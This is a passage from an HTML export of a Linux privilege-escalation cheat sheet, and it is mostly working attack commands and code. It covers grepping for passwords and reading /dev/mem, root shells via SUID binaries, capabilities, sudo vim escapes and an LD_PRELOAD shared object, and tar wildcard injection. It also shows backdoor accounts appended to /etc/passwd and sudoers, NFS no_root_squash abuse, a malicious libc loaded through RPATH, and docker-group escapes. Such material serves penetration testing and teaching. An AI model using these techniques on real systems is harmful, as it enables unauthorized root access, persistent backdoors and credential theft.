class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks for htpasswd files</span></li></ul><ul id="cc6c9def-8d13-475a-8c43-2aa03e1fece2" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">View www directories</span></li></ul></details></li></ul></details></li></ul><ul id="063e3702-91aa-40c1-9f5b-7a0ce73f657a" class="toggle"><li><details open=""><summary>Default/Weak Credentials:</summary><ul id="3e979a6f-b6f6-4970-89bb-ca352e7df831" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks for default/weak Postgres accounts</span></li></ul><ul id="0cebeae0-0f05-4e03-87e1-f6495c092d57" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks for default/weak MYSQL accounts</span></li></ul></details></li></ul><ul id="f03aa70d-3a1d-4750-a650-24818f54e176" class="toggle"><li><details open=""><summary>Searches:</summary><ul id="4c68eca5-9a54-4d41-a780-5263ce1b3827" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate all SUID/GUID files</span></li></ul><ul id="5d6b4452-e76e-43ad-973b-7e3f36ffd1ac" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate all world-writable SUID/GUID files</span></li></ul><ul id="c289c6db-67a6-4ec8-9e00-43711f69a2ea" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate all SUID/GUID files owned by root</span></li></ul><ul id="4ec8b8ee-d993-4827-a11d-445caf4c4a1a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate &#x27;interesting&#x27; SUID/GUID files (i.e. nmap, vim etc)</span></li></ul><ul id="08da90b4-6bf8-4cbb-9a78-3b39879a69cf" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate files with POSIX capabilities</span></li></ul><ul id="c9b91357-91d5-4f9f-a2a0-477edd84a8a4" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List all world-writable files</span></li></ul><ul id="0065f81c-2d81-435e-8ccd-b25b555a494f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Find/list all accessible *.plan files and display contents</span></li></ul><ul id="df07bfc6-0727-463c-aacd-5b5003488b67" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Find/list all accessible *.rhosts files and display contents</span></li></ul><ul id="eb0eafc1-0db9-413d-a2c0-d496f95e4afd" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Show NFS server details</span></li></ul><ul id="098e54e9-dc0a-4872-ae75-e2d0eedbd72c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate *.conf and *.log files containing keyword supplied at script runtime</span></li></ul><ul id="d6e4f24d-ca0a-4290-b5ac-ad0ce1ce7463" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List all *.conf files located in /etc</span></li></ul><ul id="a8006a79-d352-43f3-a545-5037d0e68fee" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate mail</span></li></ul></details></li></ul><ul id="fd9947fb-8dfa-4784-af6d-d3035b89a656" class="toggle"><li><details open=""><summary>Platform/software specific tests:</summary><ul id="ccf991c0-ce8a-4b58-9074-b501561cd8d2" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks to determine if we&#x27;re in a Docker container</span></li></ul><ul id="7964eda1-e89e-4998-8996-8e4fa17f6073" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks to see if the host has Docker installed</span></li></ul><ul id="50031d9e-c45d-425e-a175-112932653c4a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks to determine if we&#x27;re in an LXC container</span></li></ul><p id="fbab6745-f3af-4eb7-a448-3e446c1bb3a0" class="">
+</p></details></li></ul><h2 id="5db48da8-cf9f-4676-bf03-4692d7c07942" class="">Looting for passwords</h2><h3 id="1b1d8e7f-4c32-4054-b40b-98eb825ab48d" class="">Files containing passwords</h3><pre id="4bdfe54a-0c1f-404f-b665-72b62a7fba88" class="code"><code>grep --color=auto -rnw &#x27;/&#x27; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;</code></pre><h3 id="f58329f2-c7c6-48a1-a9ba-0c32e6758c4a" class="">Old passwords in /etc/security/opasswd</h3><p id="a2aadf2b-9e39-49e1-b769-9ff21169896b" class="">The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p><p id="0cea1b82-33c8-45db-b238-bf5e56f473fe" class="">⚠️ Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes</p><h3 id="6f02a847-49c7-42e5-81a8-e41f38012863" class="">Last edited files</h3><p id="062c6487-25b9-4a2e-ac94-2d6b64e1276f" class="">Files that were edited in the last 10 minutes</p><pre id="bf22ce7a-81f6-4030-aeeb-bfccce968336" class="code"><code>find / -mmin -10 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;</code></pre><h3 id="81f9c3b0-caa6-4691-abfd-18c6935285cd" class="">In memory passwords</h3><pre id="a93a3d72-97e6-4299-8f7a-0b71b7522cf7" class="code"><code>strings /dev/mem -n10 | grep -i PASS</code></pre><h3 id="773e4b30-e316-4e83-8552-ecf18c0735c5" class="">Find sensitive files</h3><pre id="6123fe4c-09bc-41fd-99c2-1f426e1b2f20" class="code"><code>$ locate password | more           
+/boot/grub/i386-pc/password.mod
+/etc/pam.d/common-password
+/etc/pam.d/gdm-password
+/etc/pam.d/gdm-password.original
+/lib/live/config/0031-root-password
+...</code></pre><h2 id="f1f43a85-20db-49cb-a39a-2f63d49734a3" class="">Scheduled tasks</h2><h3 id="b47a87c6-56ad-4fe9-bb6a-92fc17ee99f2" class="">Cron jobs</h3><p id="ac6d812d-39d0-495f-99e1-7cff3b41bc91" class="">Check if you have access with write permission on these files. Check inside the file, to find other paths with write permissions.</p><pre id="38b306bc-9692-40f4-a0ed-2705c8918620" class="code"><code>/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*</code></pre><p id="e7f42395-efb5-4e2c-9852-24de9cdde45f" class="">You can use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to detect a CRON job.</p><pre id="5070b050-8809-44e0-8543-2b53fa2a8bba" class="code"><code># print both commands and file system events and scan procfs every 1000 ms (=1sec)
+./pspy64 -pf -i 1000</code></pre><h2 id="428a332c-cec5-48f6-a85f-d3a8e6ce6035" class="">Systemd timers</h2><pre id="78443700-0710-40bc-81ce-934db48409cd" class="code"><code>systemctl list-timers --all
+NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+3 timers listed.</code></pre><h2 id="70b85ef8-acaf-4797-8046-8bdd769d55c3" class="">SUID</h2><p id="765dc653-b764-4800-a30f-71daf171fcc6" class="">SUID/Setuid stands for &quot;set user ID upon execution&quot;, it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p><pre id="03be6d10-0732-43b8-92ee-5d5748a88cd8" class="code"><code>╭─swissky@lab ~  
+╰─$ ls /usr/bin/sudo -alh                  
+-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo</code></pre><h3 id="c60bcb8b-36e4-4b27-a497-415f27131ee1" class="">Find SUID binaries</h3><pre id="ec40f857-d778-4a2d-8567-433433c03a29" class="code"><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
+find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</code></pre><h3 id="5a963e39-8a94-423a-8488-ff21164e2300" class="">Create a SUID binary</h3><pre id="f07118b4-4710-43b9-bcae-d471c1a33711" class="code"><code>print &#x27;int main(void){\nsetresuid(0, 0, 0);\nsystem(&quot;/bin/sh&quot;);\n}&#x27; &gt; /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit</code></pre><h2 id="d00027a2-a11f-497b-b895-345822b52366" class="">Capabilities</h2><h3 id="e741a6e1-80de-405a-a8d7-f29e5781a2f5" class="">List capabilities of binaries</h3><pre id="6a643da1-7470-46d6-8b0d-e6242c0ed4fa" class="code"><code>╭─swissky@lab ~  
+╰─$ /usr/bin/getcap -r  /usr/bin
+/usr/bin/fping                = cap_net_raw+ep
+/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/rlogin               = cap_net_bind_service+ep
+/usr/bin/ping                 = cap_net_raw+ep
+/usr/bin/rsh                  = cap_net_bind_service+ep
+/usr/bin/rcp                  = cap_net_bind_service+ep</code></pre><h3 id="7434b588-33bf-4c3f-a735-ebd3b689838b" class="">Edit capabilities</h3><pre id="c355401b-0952-41d1-be9e-f22121710e6a" class="code"><code>/usr/bin/setcap -r /bin/ping            # remove
+/usr/bin/setcap cap_net_raw+p /bin/ping # add</code></pre><h3 id="8de9c1f9-55ca-40c7-b40f-1fc044ceb8ff" class="">Interesting capabilities</h3><p id="f68c4572-5e3a-4540-a24c-180be17b7115" class="">Having the capability =ep means the binary has all the capabilities.</p><pre id="72a7b669-133d-453b-bdc0-0f2fc8321cfa" class="code"><code>$ getcap openssl /usr/bin/openssl 
+openssl=ep</code></pre><p id="42399f7c-8f92-44f4-8ac0-af111e3c82b2" class="">Alternatively the following capabilities can be used in order to upgrade your current privileges.</p><pre id="9a2e8081-2f00-4ccb-8b99-69ebc1a8023d" class="code"><code>cap_dac_read_search # read anything
+cap_setuid+ep # setuid</code></pre><p id="fd035b7c-4103-46db-8640-418a561935e3" class="">Example of privilege escalation with <code>cap_setuid+ep</code></p><pre id="c4a9f4f2-907b-4588-b8ab-1c60af4277ed" class="code"><code>$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+
+$ python2.7 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;
+sh-5.0# id
+uid=0(root) gid=1000(swissky)</code></pre><p id="4a280605-3a13-4999-a9e1-e31b25753d6b" class="">
+</p><p id="bbbba0c3-00a2-44e3-9f0c-acb4b19ecad0" class="">
+</p><div id="342d81c2-79d5-400b-a92b-8c259043a6e2" class="collection-content"><h4 class="collection-title"></h4><table class="collection-content"><thead><tr><th>Capabilities name</th><th>Description</th></tr></thead><tbody><tr id="70d5e452-28d5-4d58-9492-d1e4e4592e83"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_AUDIT_CONTROL.html">CAP_AUDIT_CONTROL</a></td><td class="cell-w)#a">Allow to enable/disable kernel auditing</td></tr><tr id="5b436e10-94ea-4b8b-bdf3-b079c1531d58"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_AUDIT_WRITE.html">CAP_AUDIT_WRITE</a></td><td class="cell-w)#a">Helps to write records to kernel auditing log</td></tr><tr id="a77bf590-05db-4025-bacd-9f42f20b12e5"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_BLOCK_SUSPEND.html">CAP_BLOCK_SUSPEND</a></td><td class="cell-w)#a">This feature can block system suspends</td></tr><tr id="e130b36a-bb2d-4370-aff5-d35754ce2fab"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_CHOWN.html">CAP_CHOWN</a></td><td class="cell-w)#a">Allow user to make arbitrary change to files UIDs and GIDs</td></tr><tr id="e4eed6bc-9bf9-46af-9ee9-c73207f36726"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_DAC_OVERRIDE.html">CAP_DAC_OVERRIDE</a></td><td class="cell-w)#a">This helps to bypass file read, write and execute permission checks</td></tr><tr id="e37fe7a5-d9c9-4fe8-bf7e-865297249594"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_DAC_READ_SEARCH.html">CAP_DAC_READ_SEARCH</a></td><td class="cell-w)#a">This only bypass file and directory read/execute permission checks</td></tr><tr id="c5b208b9-ae9a-471c-bb5a-c9ab7c8fa18f"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_FOWNER.html">CAP_FOWNER</a></td><td class="cell-w)#a">This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td></tr><tr id="ae2f4985-17f2-46fd-8451-9164b758cd3b"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_KILL.html">CAP_KILL</a></td><td class="cell-w)#a">Allow the sending of signals to processes belonging to others</td></tr><tr id="18754582-6c36-451b-b320-e7f7a8fd4431"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_SETGID.html">CAP_SETGID</a></td><td class="cell-w)#a">Allow changing of the GID</td></tr><tr id="3f48cf64-5ffa-48d1-8e78-998edc56be4d"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_SETUID.html">CAP_SETUID</a></td><td class="cell-w)#a">Allow changing of the UID</td></tr><tr id="e958854a-d56f-4b56-b0da-51980b958cfe"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_SETPCAP.html">CAP_SETPCAP</a></td><td class="cell-w)#a">Helps to transferring and removal of current set to any PID</td></tr><tr id="faf529a5-f4e3-40fd-a40b-f321d4c2fef0"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_IPC_LOCK.html">CAP_IPC_LOCK</a></td><td class="cell-w)#a">This helps to lock memory</td></tr><tr id="57d61add-fba9-4f6a-b24e-5eade97999fa"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_MAC_ADMIN.html">CAP_MAC_ADMIN</a></td><td class="cell-w)#a">Allow MAC configuration or state changes</td></tr><tr id="299c920c-924e-40f6-a6d6-1a8bf0de038b"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_NET_RAW.html">CAP_NET_RAW</a></td><td class="cell-w)#a">Use RAW and PACKET sockets</td></tr><tr id="329503d6-4f5d-4338-b74d-2dc779bdca88"><td class="cell-title"><a href="Linux%20Privilege%20Escalation/Untitled%20Database/CAP_NET_BIND_SERVICE.html">CAP_NET_BIND_SERVICE</a></td><td class="cell-w)#a">SERVICE Bind a socket to internet domain privileged ports</td></tr></tbody></table></div><h2 id="05ea8bae-c1ff-480f-9e8e-aac6d6eb26a4" class="">SUDO</h2><p id="da77d241-c860-406c-a1ac-6f868dbf8f4e" class="">Tool: <a href="https://github.com/TH3xACE/SUDO_KILLER">Sudo Exploitation</a></p><h3 id="8d71bfd4-4751-4d96-b24b-dc5f2bb7d5c0" class="">NOPASSWD</h3><p id="56d89c07-5956-4406-80d3-c2d3d161783f" class="">Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.</p><pre id="469639d6-fc5a-4cad-861d-2868fdd5fc08" class="code"><code>$ sudo -l
+
+User demo may run the following commands on crashlab:
+    (root) NOPASSWD: /usr/bin/vim</code></pre><p id="de38ab26-bac8-49c4-860b-bfecd1e9722f" class="">In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p><pre id="4911a19a-6dc1-44ed-ac78-664993ce8aca" class="code"><code>sudo vim -c &#x27;!sh&#x27;
+sudo -u root vim -c &#x27;!sh&#x27;</code></pre><h3 id="4c5d9c5e-e7b9-425e-a828-06428efc213a" class="">LD_PRELOAD and NOPASSWD</h3><p id="065b2863-0c59-4e15-b3c4-06d6bc46ba5a" class="">If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p><pre id="9b00d69e-6fbb-49aa-8f4f-4735a55c638d" class="code"><code>Defaults        env_keep += LD_PRELOAD</code></pre><p id="3c38fbba-521f-484d-8d93-631df6e4593a" class="">Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p><pre id="03ef091c-37a5-4ef5-98d3-4871280f09a7" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() {
+	unsetenv(&quot;LD_PRELOAD&quot;);
+	setgid(0);
+	setuid(0);
+	system(&quot;/bin/sh&quot;);
+}</code></pre><p id="b17df907-7926-4aa1-8cd6-f428ba40c47d" class="">Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p><h3 id="1db1be80-dbf0-4152-a826-c08239ad81ac" class="">Doas</h3><p id="5e659a55-e7de-4ef5-89cd-702a53a4504b" class="">There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p><pre id="5272452c-21a2-4acb-aa56-388187a69210" class="code"><code>permit nopass demo as root cmd vim</code></pre><h3 id="529a7014-6837-4ded-ab24-7b265fc17f38" class="">sudo_inject</h3><p id="f658f76a-43b4-4d14-9a53-ddbd2bd55cf0" class="">Using <a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p><pre id="002286a5-63ed-47c1-af8f-3c01e6ab92a4" class="code"><code>$ sudo whatever
+[sudo] password for user:    
+# Press &lt;ctrl&gt;+c since you don&#x27;t have the password. 
+# This creates an invalid sudo tokens.
+$ sh exploit.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre><p id="d40c4e73-7d0e-4ca1-99d6-1aec5d7f8c32" class="">Slides of the presentation : <a href="https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf">https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p><h2 id="0e0840fe-7c0c-4fd2-8e7f-0718bb1f4426" class="">GTFOBins</h2><p id="a7e9bf3f-ebbc-47b1-b5fa-b6d25b9081ac" class=""><a href="https://gtfobins.github.io/">GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p id="3a657715-0081-4961-ab6f-ad877c62e88f" class="">The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p><blockquote id="618fb28c-65f2-48cf-b801-1ae37ea7ca89" class="">gdb -nx -ex &#x27;!sh&#x27; -ex quit sudo mysql -e &#x27;! /bin/sh&#x27; strace -o /dev/null /bin/sh sudo awk &#x27;BEGIN {system(&quot;/bin/sh&quot;)}&#x27;</blockquote><h2 id="e75b062a-a117-4858-bcba-f9cda99cbef7" class="">Wildcard</h2><p id="15733890-3001-4edd-b472-3294387891d7" class="">By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that&#x27;s where the wildcard comes in handy.</p><pre id="094b3087-5279-444c-a5a9-601eaa41d2b3" class="code"><code># create file for exploitation
+touch -- &quot;--checkpoint=1&quot;
+touch -- &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &quot;#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag&quot; &gt; shell.sh
+
+# vulnerable script
+tar cf archive.tar *</code></pre><p id="52af01f2-e2a2-4c67-8bb8-11c1a8b51f1f" class="">Tool: <a href="https://github.com/localh0t/wildpwn">wildpwn</a></p><h2 id="b9eeb552-12e8-48d4-bb7a-a49d70d0bb80" class="">Writable files</h2><p id="71c50ed7-5056-40d4-a729-e04c2f3d77d8" class="">List world writable files on the system.</p><pre id="c88eaa1a-e388-4abd-9708-5def0e9c9deb" class="code"><code>find / -writable ! -user \`whoami\` -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; -exec ls -al {} \; 2&gt;/dev/null
+find / -perm -2 -type f 2&gt;/dev/null
+find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null</code></pre><h3 id="ccef80bc-b8fb-455c-ad2f-b326f310b27b" class="">Writable /etc/passwd</h3><p id="98c31400-9a33-47a4-a95d-38cdae49a629" class="">First generate a password with one of the following commands.</p><pre id="66012600-720a-4973-993f-b98e2255e354" class="code"><code>openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c &#x27;import crypt; print crypt.crypt(&quot;hacker&quot;, &quot;$6$salt&quot;)&#x27;</code></pre><p id="e201e9dc-d5e3-44f0-b86d-868b26cd58b4" class="">Then add the user <code>hacker</code> and add the generated password.</p><pre id="351ec072-fcd1-41a7-a276-bffc0fb1e13e" class="code"><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash</code></pre><p id="e1dffd6e-228b-41b7-b9d4-f4c7c6da9220" class="">E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p><p id="30ff5e9b-f645-4ed4-8428-0571d43bec8b" class="">You can now use the <code>su</code> command with <code>hacker:hacker</code></p><p id="912129d8-22a5-461c-8374-be19107b05ba" class="">Alternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine.</p><pre id="2daaee58-7e4d-409f-a3a2-141fd8886da0" class="code"><code>echo &#x27;dummy::0:0::/root:/bin/bash&#x27; &gt;&gt;/etc/passwd
+su - dummy</code></pre><p id="4eedc49c-a174-4a7b-9994-bcf6bb6c1346" class="">NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>.</p><h3 id="94eef76d-b6d2-4c85-be90-1fe974e70fb1" class="">Writable /etc/sudoers</h3><pre id="f4081a3f-f488-401e-8d69-ebaca0762bfb" class="code"><code>echo &quot;username ALL=(ALL:ALL) ALL&quot;&gt;&gt;/etc/sudoers
+
+# use SUDO without password
+echo &quot;username ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt;/etc/sudoers
+echo &quot;username ALL=NOPASSWD: /bin/bash&quot; &gt;&gt;/etc/sudoers</code></pre><h2 id="1eb1478e-0261-4a5f-93a7-3e31c33cc743" class="">NFS Root Squashing</h2><p id="f7f1faf4-ec7b-4944-b28c-083baf9be3f1" class="">When <strong>no_root_squash</strong> appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p><pre id="19bc1f30-0e68-4262-8a8b-26898d27d00d" class="code"><code># remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash . 	
+
+# set suid permission
+chmod +s bash</code></pre><h2 id="b0ed2418-39cb-4b0c-b5c6-627718126f24" class="">Shared Library</h2><h3 id="7cab88b7-fc87-40d8-a2fa-d0349e977ecc" class="">ldconfig</h3><p id="7c3f7fef-6431-4055-af91-fe924cd5a707" class="">Identify shared libraries with <code>ldd</code></p><pre id="50e44095-84c5-4c6a-b958-ebc27330ef8e" class="code"><code>$ ldd /opt/binary
+    linux-vdso.so.1 (0x00007ffe961cd000)
+    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
+    /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)</code></pre><p id="ae757bc1-adcc-48a1-86d6-6d7651a1fa3e" class="">Create a library in <code>/tmp</code> and activate the path.</p><pre id="bca79002-d00b-4fa5-8989-4a62dd016074" class="code"><code>gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
+echo &quot;/tmp/&quot; &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so
+/opt/binary</code></pre><h3 id="bd878e9b-66dd-4fcd-8b14-7d4b257f0df1" class="">RPATH</h3><pre id="1440b8d4-1177-4c09-b0eb-b42f2d5f7d08" class="code"><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep &quot;NEEDED|RPATH&quot;
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =&gt;  (0x0068c000)
+ libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x005bb000)</code></pre><p id="45086210-d5b5-4e6d-8777-c4226630e14a" class="">By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p><pre id="5e257b65-d856-4d08-b2a7-5ff21151b004" class="code"><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =&gt;  (0x005b0000)
+ libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x00737000)</code></pre><p id="e2b28932-0d4e-468e-80de-f39d4f1699a8" class="">Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p><pre id="77e920b9-7e52-4be9-9c15-e08371929ad8" class="code"><code>#include&lt;stdlib.h&gt;
+#define SHELL &quot;/bin/sh&quot;
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+{
+ char *file = SHELL;
+ char *argv[] = {SHELL,0};
+ setresuid(geteuid(),geteuid(), geteuid());
+ execve(file,argv,0);
+}</code></pre><h2 id="8286b4cc-cc84-424d-9149-94814a54978b" class="">Groups</h2><h3 id="39ce6e2b-6619-4a8d-8273-02b38ab0556b" class="">Docker</h3><p id="4c8e162d-3919-44ea-b939-b23a88412f2d" class="">Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p><pre id="e8e47eda-db19-47ab-aed3-9f56309492e5" class="code"><code>$&gt; docker run -it --rm -v $PWD:/mnt bash
+$&gt; echo &#x27;toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh&#x27; &gt;&gt; /mnt/etc/passwd</code></pre><p id="4a0fab34-0aa5-48b9-8428-d10d5ea69efc" class="">Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p><pre id="bcec92c7-f15b-4d61-8843-3394652e9b9e" class="code"><code>docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash</code></pre><p id="3f63dcd4-8d12-4a7d-97b6-7558fa0c07d4" class="">Or use the following docker image from <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">chrisfosterelli</a> to spawn a root shell</p><pre id="a38bbb5e-78fd-4e23-94e6-96aeb5adf339" class="code"><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+latest: Pulling from chrisfosterelli/rootplease
+2de59b831a23: Pull complete 
+354c3661655e: Pull complete 
+91930878a2d7: Pull complete 
+a3ed95caeb02: Pull complete 
+489b110c54dc: Pull complete 
+Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
+Status: Downloaded newer image for chrisfosterelli/rootplease:latest
+
+You should now have a root shell on the host OS
+Press Ctrl-D to exit the docker instance / shell
+
+sh-5.0# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre><p id="2e7f52b6-3bbd-4cf9-bf0d-803be7664813" class="">More docker privilege escalation using the Docker Socket.</p><pre id="faf16d36-85da-45f0-93cf-fa758b58de1e" class="code"><code>sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
